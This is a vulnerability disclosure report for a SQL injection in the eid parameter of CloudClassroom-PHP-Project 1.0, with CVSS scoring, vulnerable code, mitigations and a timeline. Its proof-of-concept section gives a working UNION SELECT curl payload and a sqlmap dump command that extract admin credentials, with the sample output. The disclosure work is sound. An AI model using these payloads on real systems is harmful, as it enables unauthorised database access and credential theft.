# Vulnerability Report (NIST/NVD format) — CloudClassroom-PHP-Project 1.0 — SQL Injection in viewquery.php (parameter eid)

*Structured according to NIST SP 800-51 / NVD conventions (CVE + CWE + CVSS v3.1 + CPE).*

## 1. Vulnerability Identification
- **Internal ID:** CC-2026-16
- **Proposed CVE:** (pending assignment)
- **Report date:** 2026-08-02
- **Reporter:** oliveira.luanalmeida@gmail.com

## 2. Vulnerability Summary
Parameter `eid` is interpolated in quotes in SELECT query. Closing the quote allows `UNION SELECT`. Target table exposes 4 columns. Confirmed with unauthenticated admin credential dump.

## 3. Weakness Enumeration (CWE)
- CWE-89: SQL Injection

## 4. Affected Products (CPE 2.3)
- `cpe:2.3:a:vishalmathur:cloudclassroom-php_project:1.0:*:*:*:*:*:*:*`
- Vendor: Vishal Mathur · Product: CloudClassroom-PHP-Project · Version: 1.0
- Affected file(s): `viewquery.php`

## 5. Impact Metrics — CVSS v3.1
- **Base Score:** 9.1 (Critical)
- **Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | None (N) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | None (N) |

- **EPSS:** N/A (no CVE) — low estimate (~0.03–0.09).

## 6. Technical Description
Parameter `eid` is interpolated in quotes in SELECT query. Closing the quote allows `UNION SELECT`. Target table exposes 4 columns. Confirmed with unauthenticated admin credential dump.

Root cause:

**`viewquery.php`**

```php
$x=$_GET['eid'];
$sql="select * from <table> WHERE <col>='".$x."'";
$rs=mysqli_query($connect,$sql);
```

## 7. Attack Steps / Proof of Concept
1. Request `viewquery.php` with `eid` containing UNION payload (no cookie — item 00).
2. Adjust column count to 4 (target table) and position data in displayed column.
3. Read admin credentials reflected in response.
4. Automate with sqlmap (`-p eid`) for full database dump.

```bash
curl -s -G "http://192.168.95.131:9292/viewquery.php" \
  --data-urlencode "eid=' UNION SELECT concat(0x5b,Aid,0x3a,Apass,0x5d),2,3,4 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"\n\nsqlmap -u "http://192.168.95.131:9292/viewquery.php?eid=1" -p eid --batch --dump -T admin
```

Evidence:
```
[admin@ics.com:admin]
[vishu:vishu]
```

## 8. Impact Analysis
Arbitrary database read (C:H) — PII, plaintext passwords, admin credentials; write via UPDATE/POST sink (I:H); total chain compromise.

## 9. Recommended Mitigations
- Use prepared statements with parameter binding (`mysqli`/PDO) in 100% of queries.
- Enforce type casting for numeric identifiers (`(int)$id`) and use allowlist where applicable.
- Do not echo `$sql`/`mysqli_error()` to client (remove error oracle).
- Apply `exit;` after session guard (see item 00).

## 10. References
- https://cwe.mitre.org/
- https://www.first.org/cvss/calculator/3.1
- https://cvefeed.io/vuln/product/161371/vishalmathurcloudclassroom-php_project/

## 11. Disclosure Timeline
- 2026-08-02: Discovery and lab confirmation.
- 2026-08-02: Report drafted; coordinated disclosure initiated.
